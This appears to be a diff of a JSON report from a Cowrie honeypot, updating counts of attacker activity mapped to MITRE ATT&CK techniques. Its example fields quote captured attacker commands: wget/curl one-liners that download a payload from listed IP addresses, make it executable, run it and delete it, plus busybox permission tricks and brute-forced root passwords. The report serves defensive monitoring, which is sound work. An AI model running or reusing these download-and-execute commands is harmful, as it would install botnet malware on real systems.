@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-07 07:02:44",
+  "generated": "2026-09-07 08:04:44",
   "totals": {
-    "commands": 129,
-    "login_failed": 2089,
-    "login_success": 35,
-    "sessions": 1526
+    "commands": 132,
+    "login_failed": 2136,
+    "login_success": 40,
+    "sessions": 1592
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2089,
+      "count": 2136,
       "examples": [
         "root / 123456789",
         "root / admin1",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-09-07T00:01:55.927554Z",
-      "last": "2026-09-07T07:02:23.685808Z",
-      "unique_ips": 88
+      "last": "2026-09-07T07:56:39.132886Z",
+      "unique_ips": 93
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 35,
+      "count": 40,
       "examples": [
         "nobody / qwerty",
         "root / 1234",
@@ -37,8 +37,8 @@
         "root / senha1"
       ],
       "first": "2026-09-07T00:13:31.233466Z",
-      "last": "2026-09-07T06:29:39.907267Z",
-      "unique_ips": 31
+      "last": "2026-09-07T07:47:50.147071Z",
+      "unique_ips": 35
     },
     {
       "id": "T1105",
@@ -60,7 +60,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 22,
+      "count": 23,
       "examples": [
         "/bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox aylVUljl",
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
@@ -69,74 +69,74 @@
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
       ],
       "first": "2026-09-07T02:03:30.215772Z",
-      "last": "2026-09-07T05:10:27.979344Z",
-      "unique_ips": 4
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 5
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 6,
       "examples": [
         "uname -s -v -n -r -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-07T00:37:38.080506Z",
-      "last": "2026-09-07T06:02:14.478778Z",
-      "unique_ips": 3
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 3,
+      "count": 4,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-07T02:35:50.790727Z",
-      "last": "2026-09-07T03:08:41.138573Z",
-      "unique_ips": 2
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 3
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-07T03:08:41.138573Z",
-      "last": "2026-09-07T05:09:52.272071Z",
-      "unique_ips": 2
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 3
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 2,
+      "count": 3,
       "examples": [
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-07T02:35:50.886922Z",
-      "last": "2026-09-07T03:08:41.138573Z",
-      "unique_ips": 2
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 3
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "ls /",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-07T02:20:42.245168Z",
-      "last": "2026-09-07T03:08:41.138573Z",
-      "unique_ips": 2
+      "last": "2026-09-07T07:24:32.287610Z",
+      "unique_ips": 3
     }
   ],
   "unmapped": [
@@ -205,15 +205,15 @@
       3
     ],
     [
+      "Accept-Encoding: gzip",
+      3
+    ],
+    [
       "linuxshell",
       2
     ],
     [
       "ping ;sh",
-      2
-    ],
-    [
-      "Accept-Encoding: gzip",
       2
     ],
     [
